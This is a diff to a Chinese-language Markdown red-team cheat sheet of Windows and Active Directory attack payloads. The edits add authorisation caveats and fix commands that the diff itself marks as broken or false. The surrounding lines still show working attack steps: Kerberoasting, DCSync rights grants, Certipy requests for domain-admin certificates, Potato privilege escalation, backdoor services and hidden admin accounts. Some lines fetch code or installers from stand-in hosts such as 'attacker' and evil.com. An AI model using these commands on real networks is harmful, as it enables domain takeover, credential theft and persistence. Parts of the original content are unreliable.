@@ -2,6 +2,22 @@
 
 _共 128 个结构化 payload，覆盖凭据窃取 / 横向移动 / 权限提升 / 免杀 / 域渗透 / 隧道代理 / 信息收集 / 权限维持_
 
+## 适用性、验证与恢复
+
+这些是历史工具/命令摘录，未逐条运行验证。仅限明确授权的隔离实验或有书面规则的测试；拥有一个账户或一个主机权限不自动授权抓取全部凭据、域数据库、建立后门、修改 GPO、公开隧道或影响其他会话。生产发现先用自有测试账户和最小 canary，保存变更前快照/配置与恢复计划；不关闭审计或以清日志掩盖操作。
+
+- LSASS/PPL、Credential Guard、Chrome App-Bound Encryption、工具/系统版本会限制凭据提取，管理员权限不保证所有明文可得。cmdkey /list、vaultcmd 列举并不导出密码；复制浏览器数据库本身不能解密。DCSync 需域命名上下文相应复制权限，单一“复制目录更改”标签不保证包含秘密复制权限；PowerView 不是内置模块。
+- VSS 的 HarddiskVolumeShadowCopy1 不保证是刚创建的快照；核对返回的设备路径，SAM/NTDS 离线解密还需匹配 SYSTEM。ReadAllText 不是流式读取，也不会绕过文件锁/访问监控。GPP 使用公开的对称密钥，不是“公钥”；Unattend 的隐藏密码编码还可能附加字段后缀，解码不等于通用可用口令。
+- 命令行密码可能进入日志/进程列表；用工具支持的安全提示或秘密存储。RC4、随机文件名、混淆、内存加载、微软签名、指定 DC、普通查询或低速扫描都不保证免检测。解码/加载外部脚本前应独立审查固定版本内容；不要直接远程动态求值。PowerShell v2 可能未安装/被禁用，不能宣称通用绕日志。
+- AMSI AllowBlocking=1 不是禁用 AMSI 的开关；原 GetType/GetField 混淆例语法不成立。ETW 随机 GUID/内部 SetEnabled 调用不是全局关闭 ETW；Win32.Kernel32、ClrModule、WMI helper 不是内置实现，省略的 P/Invoke、结构、地址与线程上下文使这些代码仅为概念，不能直接运行。Process.MainModule 是主 EXE，不是 ntdll；KnownDlls 也不是普通 Win32 文件映射名称。
+- BlockDLLs 的示例 SignatureLevel 不是 PROCESS_MITIGATION_BINARY_SIGNATURE_POLICY 的有效替代，阻止某些 DLL 不会关闭 EDR；CreateProcess 的 lpApplicationName/lpCommandLine 与环境变量也不会自动伪造已记录命令行。进程注入/镂空本身不提供重启后的持久化。Run/Startup 在用户登录触发，非所有启动场景；AppInit_DLLs 还有 LoadAppInit_DLLs、架构与 Secure Boot 等条件。
+- NTLM relay 取决于目标协议的签名、EPA/channel binding、补丁及身份权限；--remove-mic 只适用于特定历史漏洞。RDP 有认证不保证可中继；列出的通用 ntlmrelayx 命令没有配置 RDP 监听。Zerologon 置空 DC 密码会破坏信任/复制，单条恢复脚本并不保证无损；noPac 脚本可能直接利用而非无副作用检测。普通 ADCS User 模板发证是正常功能；ESC2 不单凭 Any Purpose 就允许任意 UPN，ESC6 还受 SID 扩展/强映射约束，ESC8 需可中继 NTLM 且缺少足够 EPA 等防护。
+- 约束委派还需实际 msDS-AllowedToDelegateTo 配置、账户密钥与可委派目标；TrustedToAuthForDelegation 不是完整枚举。RBCD 的 WriteDACL 不能直接写属性，须经授权取得实际属性写权限；Set-ADComputer 会覆盖既有委派集合。SID History、信任关系和有效票据的最终权限还受过滤、PAC 与访问策略约束，不能保证域管理员。
+- GPO/服务/注册表/证书模板修改、账户创建和网络暴露须逐项恢复并核对有效策略；不要硬编码或覆盖已有共享配置。FRP INI 是历史格式，应按版本迁移；公网转发必须限制来源、认证与端口，Ligolo -ignore-cert 是关闭证书验证，仅隔离实验允许。ngrok URL 需账户有相应域名权限。
+- Exchange 外部脚本未随技能提供，选项和漏洞链需独立审查；一个版本字符串/HTTP 200/WWW-Authenticate 头不是 exploit 证据，NTLM 域信息通常需有效 challenge 交互。邮箱导出需相应 Exchange 角色及受控 UNC 路径。SharePoint REST 正常授权访问不构成漏洞，Online 认证应采用支持的 OAuth/Graph，旧 SharePointOnlineCredentials/Basic 示例不能当现代通用流程；同步仅包含明确授权文档。
+
+核对资料：[Certipy ESC](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation)、[AlwaysInstallElevated](https://learn.microsoft.com/en-us/windows/win32/msi/alwaysinstallelevated)、[ProcessStartInfo](https://learn.microsoft.com/en-us/dotnet/api/system.diagnostics.processstartinfo)、[JuicyPotato](https://github.com/ohpe/juicy-potato)、[ngrok CLI](https://ngrok.com/docs/agent/cli)。
+
 ## 类别索引
 
 | 类别 | 数量 |
@@ -127,6 +143,7 @@ mimikatz.exe "kerberos::list /export" "exit"
 _使用Rubeus进行Kerberoasting_
 ```
 Rubeus.exe kerberoast /stats
+# /stats 仅汇总目标，不请求/输出用于破解的票据
 ```
 
 **5. Impacket GetUserSPNs**  _[linux]_
@@ -144,14 +161,14 @@ hashcat -m 13100 kerberoast.hash wordlist.txt
 **EDR 绕过变体：**
 
 **1. RC4加密**
-_使用RC4加密，避免触发告警_
+_RC4 请求并不避免告警，也可能更显著；需核对服务实际支持的加密类型_
 ```
 Rubeus.exe kerberoast /rc4opsec
 ```
 
 **分析：** Kerberoasting可以获取服务账户的Kerberos票据，离线破解后得到明文密码。
 
-**OPSEC：** Kerberoasting不需要高权限；只需要任意域用户凭证；建议使用RC4加密避免检测
+**OPSEC：** Kerberoasting不需要高权限；只需要任意域用户凭证；不能把 RC4 当作隐蔽或免检测选项
 
 ---
 
@@ -360,9 +377,9 @@ Get-NetGPPPassword
 ```
 
 **4. gpp-decrypt**  _[linux]_
-_解密GPP密码哈希_
+_解密 GPP cpassword 密文（不是哈希）_
 ```
-gpp-decrypt HASH
+gpp-decrypt CPASSWORD_CIPHERTEXT
 ```
 
 **5. Impacket提取**  _[linux]_
@@ -889,7 +906,7 @@ psexec.py -service-name CustomService domain/user:password@target_ip
 ```
 
 **2. SMBExec替代**
-_使用smbexec.py，不写入磁盘_
+_smbexec.py 创建服务并可能使用批处理/输出临时文件，不能称为不写磁盘_
 ```
 smbexec.py domain/user:password@target_ip
 ```
@@ -934,7 +951,7 @@ Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c who
 
 **EDR 绕过变体：**
 
-**1. WMI事件订阅**
+**1. WMI MSI 安装（不是事件订阅）**
 _通过WMI安装MSI包执行代码_
 ```
 wmic /node:target_ip /user:domain\user /password:pass path win32_product call install /package:"\\attacker\share\malware.msi"
@@ -1300,13 +1317,13 @@ _通过Excel执行命令_
 ```
 $obj.Workbooks.Add()
 $obj.Cells.Item(1,1) = "=CMD|/C calc.exe!A"
-$obj.Run("calc.exe")
+# Excel Application.Run 调用宏，不运行 exe；此例不能证明任意进程执行。
 ```
 
 **3. Impacket DCOM**  _[linux]_
 _使用Impacket执行_
 ```
-python dcomexec.py -object Excel.Application domain/user:password@target.com
+# Impacket dcomexec 不支持 Excel.Application 对象；不要使用未支持的 -object 值。
 ```
 
 ---
@@ -1585,7 +1602,7 @@ sc start VulnerableService
 利用AlwaysInstallElevated提权
 子类：**MSI** · tags: `msi` `alwaysinstall` `privesc`
 
-**前置条件：** AlwaysInstallElevated启用
+**前置条件：** HKCU 与 HKLM 的 AlwaysInstallElevated 均为 DWORD 1
 
 **攻击链：**
 
@@ -1696,7 +1713,7 @@ _常见SUID利用方法_
 nmap --interactive
 vim -c ':!/bin/sh'
 find / -exec /bin/sh \;
-cp /bin/sh /tmp/sh; chmod +s /tmp/sh
+# 普通用户复制 /bin/sh 再设 SUID 只保留自己的属主，不会获得 root；还需 root 属主、可利用程序和允许 SUID 的挂载等条件。
 ```
 
 **3. GTFOBins**  _[linux]_
@@ -1793,7 +1810,7 @@ _常见内核提权漏洞_
 ```
 DirtyCow (CVE-2016-5195)
 DirtyPipe (CVE-2022-0847)
-PwnKit (CVE-2021-4034)
+PwnKit (CVE-2021-4034，用户态 polkit/pkexec，非内核漏洞)
 ```
 
 ---
@@ -1821,7 +1838,7 @@ whoami /all
 echo %USERNAME%
 ```
 
-**2. JuicyPotato (Windows Server 2016/2019)**  _[windows]_
+**2. JuicyPotato（旧版 Windows；不适用于 Server 2019/Windows 10 1809 起的该机制）**  _[windows]_
 _JuicyPotato利用COM服务器和NTLM认证实现令牌模拟。通过创建本地COM服务器，欺骗SYSTEM账户向其认证，然后模拟该令牌执行命令_
 ```
 # 下载JuicyPotato
@@ -1863,10 +1880,10 @@ SweetPotato.exe -p C:\Windows\System32\cmd.exe -a "/c whoami"
 SweetPotato.exe -e EfsRpc -p cmd.exe -a "/c net user testadmin Test@123 /add"
 ```
 
-**5. GodPotato (全版本通杀)**  _[windows]_
-_GodPotato利用DCOM OXID解析器的漏洞，无需指定CLSID，兼容几乎所有Windows版本。是目前最通用的Potato变种_
+**5. GodPotato（版本、补丁、权限与系统配置受限）**  _[windows]_
+_GodPotato利用DCOM OXID解析器的漏洞，无需指定CLSID，不能保证所有版本适用，须按工具版本、Windows 构建和补丁核对_
 ```
-# GodPotato - 适用于Windows Server 2012-2022所有版本
+# GodPotato - 历史支持范围不等于所有构建/补丁均可利用
 GodPotato.exe -cmd "cmd /c whoami"
 
 # 执行反弹Shell
@@ -1900,10 +1917,10 @@ _根据目标系统版本选择合适的Potato变种工具_
 # 2. systeminfo 确认系统版本
 #
 # Windows Server 2012-2016 => JuicyPotato
-# Windows Server 2019 (1809之前) => JuicyPotato (需正确CLSID)
+# Server 2019 不适用原 JuicyPotato；不能虚构“Server 2019 1809之前”分支
 # Windows 10/Server 2019+ => PrintSpoofer 或 GodPotato
 # Windows Server 2022 => GodPotato
-# 所有版本 => SweetPotato (自动选择)
+# SweetPotato 的模式和兼容性仍需分别核对，不是全版本保证
 # 需要远程中继 => RoguePotato
 #
 # 常用CLSID查询: https://ohpe.it/juicy-potato/CLSID/
@@ -1956,7 +1973,7 @@ IEX (New-Object Net.WebClient).DownloadString("http://attacker/script.ps1")  # s
 **3. 混淆变量名**  _[windows]_
 _变量名混淆_
 ```
-1='IEX'; 2='(New-Object Net.WebClient).DownloadString'; Invoke-Expression "1 2"  # security-allowlist: SEC004
+# 原例没有 $ 变量前缀，且 动态求值 "1 2" 不构成有效加载器；不提供免检测保证。
 ```
 
 **4. 无文件执行**  _[windows]_
@@ -2300,7 +2317,7 @@ _PowerShell PPID欺骗_
 $parent = Get-Process -Name explorer
 $pi = New-Object System.Diagnostics.ProcessStartInfo
 $pi.FileName = "cmd.exe"
-$pi.ParentProcessId = $parent.Id
+# ProcessStartInfo 没有 ParentProcessId 属性；此块不会实现 PPID 欺骗。
 [System.Diagnostics.Process]::Start($pi)
 ```
 
@@ -2503,7 +2520,7 @@ Get-ObjectAcl -ResolveGUIDs | Where-Object {$_.ActiveDirectoryRights -like "*Wri
 **3. 利用WriteDACL**  _[windows]_
 _添加DCSync权限_
 ```
-Add-DomainObjectAcl -TargetIdentity TARGET$ -Rights DCSync -PrincipalIdentity CONTROLLED_USER
+Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=com" -Rights DCSync -PrincipalIdentity CONTROLLED_USER
 ```
 
 **4. 执行DCSync**  _[windows]_
@@ -2529,7 +2546,7 @@ Set-DomainUserPassword -Identity TARGET_USER -AccountPassword (ConvertTo-SecureS
 **1. 隐蔽操作**
 _指定域控制器操作_
 ```
-Add-DomainObjectAcl -TargetIdentity TARGET$ -Rights DCSync -PrincipalIdentity CONTROLLED_USER -DomainController dc.domain.com
+Add-DomainObjectAcl -TargetIdentity "DC=domain,DC=com" -Rights DCSync -PrincipalIdentity CONTROLLED_USER -DomainController dc.domain.com
 ```
 
 **分析：** 域内ACL错误配置是常见的权限提升路径，可以通过BloodHound发现。
@@ -2660,7 +2677,7 @@ python CVE-2021-34527.py -target DC_IP -payload DLL_PATH
 _使用Impacket_
 ```
 python dementor.py -d domain -u user -p pass \\attacker\share DC_IP
-触发加载远程DLL
+Dementor 是强制认证示例，不会自行加载远程 DLL，也不是 PrintNightmare exploit。
 ```
 
 ---
@@ -2676,7 +2693,7 @@ CVE-2021-36942 强制认证攻击
 **1. 启动中继**  _[linux]_
 _启动NTLM中继_
 ```
-python ntlmrelayx.py -t ldap://DC_IP -smb2support --adcs
+python ntlmrelayx.py -t http://CA_SERVER/certsrv/certfnsh.asp -smb2support --adcs
 设置NTLM中继到ADCS
 ```
 
@@ -2786,7 +2803,7 @@ certipy find -u user@domain -p password -vulnerable
 **2. 利用ESC1**  _[linux]_
 _请求域管证书_
 ```
-certipy req -u user@domain -p password -ca CA_NAME -template ESC1_TEMPLATE -alt admin@domain
+certipy req -u user@domain -p password -ca CA_NAME -template ESC1_TEMPLATE -upn admin@domain
 指定SAN为域管
 ```
 
@@ -2907,7 +2924,7 @@ _常见利用场景_
 **1. 查找可编辑GPO**  _[windows]_
 _查找可编辑GPO_
 ```
-Get-GPO -All | Where-Object { $_ | Get-GPPermission -TargetType User -TargetName "Domain Users" -PermissionLevel GpoEdit }
+Get-GPO -All | Where-Object { $_ | Get-GPPermission -TargetType Group -TargetName "Domain Users" | Where-Object { $_.Permission -in @("GpoEdit", "GpoEditDeleteModifySecurity") } }
 查找Domain Users可编辑的GPO
 ```
 
@@ -3173,7 +3190,7 @@ dnscat2-v0.07-client-win32.exe --dns domain=evil.com --secret SECRET
 ```
 
 **3. 建立隧道**  _[linux]_
-_建立SOCKS隧道_
+_建立固定 TCP 转发；不是创建 SOCKS 服务_
 ```
 session -i 1
 listen 127.0.0.1:1080 10.0.0.1:1080
@@ -3289,8 +3306,8 @@ run
 _安装并配置Ngrok_
 ```
 下载: https://ngrok.com/download
-tar -xvzf ngrok.zip
-./ngrok authtoken YOUR_TOKEN
+unzip ngrok.zip
+./ngrok config add-authtoken YOUR_TOKEN
 ```
 
 **2. HTTP隧道**
@@ -3310,7 +3327,7 @@ _创建TCP隧道_
 **4. 自定义域名**
 _使用自定义域名_
 ```
-./ngrok http -hostname=custom.domain.com 80
+./ngrok http --url=custom.domain.com 80
 ```
 
 ---
@@ -4061,7 +4078,7 @@ sc create Backdoor binPath= "C:\backdoor.exe" start= auto
 **1. 隐藏注册表键**
 _使用空字节隐藏注册表键_
 ```
-reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\x00" /v Backdoor /t REG_SZ /d "C:\backdoor.exe" /f
+# CMD 的 \x00 是普通字符，不会创建 NUL 隐藏键；原例不是有效隐藏方法。
 ```
 
 **分析：** 注册表持久化会在系统启动或用户登录时执行恶意程序。
@@ -4222,9 +4239,8 @@ net localgroup administrators hidden$ /add
 **3. 注册表隐藏**  _[windows]_
 _通过注册表完全隐藏_
 ```
-reg export "HKLM\SAM\SAM\Domains\Account\Users\000003E9" user.reg
-修改F值
-reg import user.reg
+# 不修改硬编码 RID 的 SAM 项：000003E9 不保证对应测试账户，修改 F 值会损坏账户库。
+# 在隔离快照中审查真实 SID/RID；$ 后缀不保证用户隐藏。
 ```
 
 ---
@@ -4310,7 +4326,7 @@ Get-Process lsass
 **1. 获取DSRM密码**  _[windows]_
 _获取DSRM账户哈希_
 ```
-mimikatz # lsadump::lsa /patch /name:krbtgt
+# krbtgt 是域 Kerberos 账户，不是 DSRM 本地 Administrator；不能用此命令获取 DSRM 哈希。
 或
 mimikatz # token::elevate
 mimikatz # lsadump::sam
@@ -4429,14 +4445,14 @@ CVE-2021-26855 Exchange SSRF
 **1. 探测漏洞**  _[linux]_
 _检查Exchange版本_
 ```
-curl -k https://exchange.com/owa/auth/x.js
+curl -k https://AUTHORIZED_EXCHANGE_HOST/owa/auth/x.js
 检查Exchange版本
 ```
 
 **2. 利用脚本**  _[linux]_
 _利用ProxyLogon_
 ```
-python proxylogon.py -u https://exchange.com -e admin@domain.com
+python proxylogon.py -u https://AUTHORIZED_EXCHANGE_HOST -e admin@domain.com
 获取管理员邮箱访问权限
 ```
 
@@ -4463,14 +4479,14 @@ CVE-2021-34473 Exchange RCE
 **1. 探测漏洞**  _[linux]_
 _探测漏洞_
 ```
-curl -k "https://exchange.com/autodiscover/autodiscover.json?@foo.com/mapi/nspi?&Email=autodiscover/autodiscover.json%3f@foo.com"
+curl -k "https://AUTHORIZED_EXCHANGE_HOST/autodiscover/autodiscover.json?@foo.com/mapi/nspi?&Email=autodiscover/autodiscover.json%3f@foo.com"
 检查是否存在漏洞
 ```
 
 **2. 利用脚本**  _[linux]_
 _利用ProxyShell_
 ```
-python proxyshell.py -u https://exchange.com -e admin@domain.com
+python proxyshell.py -u https://AUTHORIZED_EXCHANGE_HOST -e admin@domain.com
 获取邮箱访问并执行命令
 ```
 
@@ -4494,28 +4510,28 @@ GET /autodiscover/autodiscover.json?@domain.com/owa/?&Email=admin@domain.com HTT
 **1. 版本探测**  _[linux]_
 _探测Exchange版本_
 ```
-curl -k https://exchange.com/owa/auth/logon.aspx
+curl -k https://AUTHORIZED_EXCHANGE_HOST/owa/auth/logon.aspx
 检查页面源码获取版本信息
 ```
 
 **2. Autodiscover**  _[linux]_
 _Autodiscover枚举_
 ```
-curl -k -u user:pass https://exchange.com/autodiscover/autodiscover.xml
+curl -k -u user:pass https://AUTHORIZED_EXCHANGE_HOST/autodiscover/autodiscover.xml
 获取Exchange配置信息
 ```
 
 **3. 邮箱枚举**  _[linux]_
 _枚举邮箱用户_
 ```
-python oab.py https://exchange.com
+python oab.py https://AUTHORIZED_EXCHANGE_HOST
 下载离线通讯录枚举用户
 ```
 
 **4. NTLM泄露**  _[linux]_
 _NTLM信息泄露_
 ```
-curl -k https://exchange.com/autodiscover/autodiscover.xml
+curl -k https://AUTHORIZED_EXCHANGE_HOST/autodiscover/autodiscover.xml
 从WWW-Authenticate头获取域信息
 ```
 
@@ -4533,22 +4549,22 @@ curl -k https://exchange.com/autodiscover/autodiscover.xml
 _检测漏洞_
 ```
 使用ProxyToken工具:
-python proxytoken.py -u https://exchange.com -e user@domain.com
+python proxytoken.py -u https://AUTHORIZED_EXCHANGE_HOST -e user@domain.com
 检测是否存在漏洞
 ```
 
 **2. 利用漏洞**  _[linux]_
 _获取邮箱访问_
 ```
-python proxytoken.py -u https://exchange.com -e user@domain.com -a
+python proxytoken.py -u https://AUTHORIZED_EXCHANGE_HOST -e user@domain.com -a
 获取用户邮箱访问权限
 ```
 
 **3. 访问邮箱**
 _访问EWS接口_
 ```
-curl -k https://exchange.com/ews/Exchange.asmx -H "X-ClientApplication: Test"
-绕过认证访问EWS
+curl -k https://AUTHORIZED_EXCHANGE_HOST/ews/Exchange.asmx -H "X-ClientApplication: Test"
+X-ClientApplication 只是客户端标识，不是 ProxyToken 认证绕过证据
 ```
 
 ---
@@ -4564,7 +4580,7 @@ curl -k https://exchange.com/ews/Exchange.asmx -H "X-ClientApplication: Test"
 **1. OWA访问**
 _OWA Web访问_
 ```
-https://exchange.com/owa
+https://AUTHORIZED_EXCHANGE_HOST/owa
 使用凭证登录OWA
 查看邮件、日历等
 ```
@@ -4610,7 +4626,7 @@ New-MailboxExportRequest -Mailbox user@domain.com -FilePath "\\server\share\user
 _探测ESC2模板_
 ```
 certipy find -u user@domain.com -p password -dc-ip DC_IP
-查找Any Purpose或CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT模板
+ESC2 是 Any Purpose/无 EKU 等条件；CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT 是 ESC1 的相关条件，不能混为一类
 ```
 
 **2. 请求证书**  _[linux]_
@@ -4690,7 +4706,7 @@ certipy req -u user@domain.com -p password -ca CA_NAME -template VULNERABLE_TEMP
 _恢复模板配置_
 ```
 certipy template -u user@domain.com -p password -template VULNERABLE_TEMPLATE -configuration old_config.json
-恢复原配置避免检测
+恢复原配置并由管理员核对差异、保留审计证据
 ```
 
 ---
@@ -4713,8 +4729,8 @@ certipy find -u user@domain.com -p password -dc-ip DC_IP
 **2. 请求证书**  _[linux]_
 _请求管理员证书_
 ```
-certipy req -u user@domain.com -p password -ca CA_NAME -template User -alt administrator@domain.com
-使用-alt参数指定SAN
+certipy req -u user@domain.com -p password -ca CA_NAME -template User -upn administrator@domain.com
+按当前 Certipy 的 -upn 参数指定 UPN；强映射/证书 SID 等条件仍需核对
 ```
 
 **3. 使用证书认证**  _[linux]_
@@ -4773,28 +4789,28 @@ _触发目标NTLM认证_
 **1. 站点枚举**  _[linux]_
 _枚举站点_
 ```
-curl -k https://sharepoint.com/_api/web/webs
+curl -k https://AUTHORIZED_TENANT.sharepoint.com/_api/web/webs
 获取所有子站点
 ```
 
 **2. 用户枚举**  _[linux]_
 _枚举用户_
 ```
-curl -k https://sharepoint.com/_api/web/siteusers
+curl -k https://AUTHORIZED_TENANT.sharepoint.com/_api/web/siteusers
 获取站点用户列表
 ```
 
 **3. 文件枚举**  _[linux]_
 _枚举文档库_
 ```
-curl -k https://sharepoint.com/_api/web/lists
+curl -k https://AUTHORIZED_TENANT.sharepoint.com/_api/web/lists
 获取文档库列表
 ```
 
 **4. 搜索文件**  _[linux]_
 _搜索敏感内容_
 ```
-curl -k "https://sharepoint.com/_api/search/query?querytext='password'"
+curl -k "https://AUTHORIZED_TENANT.sharepoint.com/_api/search/query?querytext='password'"
 搜索敏感文件
 ```
 
@@ -4811,7 +4827,7 @@ curl -k "https://sharepoint.com/_api/search/query?querytext='password'"
 **1. Web界面访问**
 _Web界面访问_
 ```
-https://sharepoint.com/sites/site_name/Shared Documents
+https://AUTHORIZED_TENANT.sharepoint.com/sites/site_name/Shared Documents
 通过浏览器访问文档库
 下载敏感文件
 ```
@@ -4819,16 +4835,16 @@ https://sharepoint.com/sites/site_name/Shared Documents
 **2. REST API访问**  _[linux]_
 _REST API访问_
 ```
-curl -k -u user:password "https://sharepoint.com/_api/web/lists/getbytitle('Documents')/items"
+curl -k -u user:password "https://AUTHORIZED_TENANT.sharepoint.com/_api/web/lists/getbytitle('Documents')/items"
 获取文档列表
-下载文件内容
+items 返回列表项元数据，不等于下载文件字节；文件内容需授权的文件端点
 ```
 
 **3. CSOM访问**  _[windows]_
 _CSOM访问_
 ```
 使用SharePoint客户端对象模型:
-ClientContext context = new ClientContext("https://sharepoint.com");
+ClientContext context = new ClientContext("https://AUTHORIZED_TENANT.sharepoint.com");
 context.Credentials = new SharePointOnlineCredentials(user, password);
 List list = context.Web.Lists.GetByTitle("Documents");
 ```
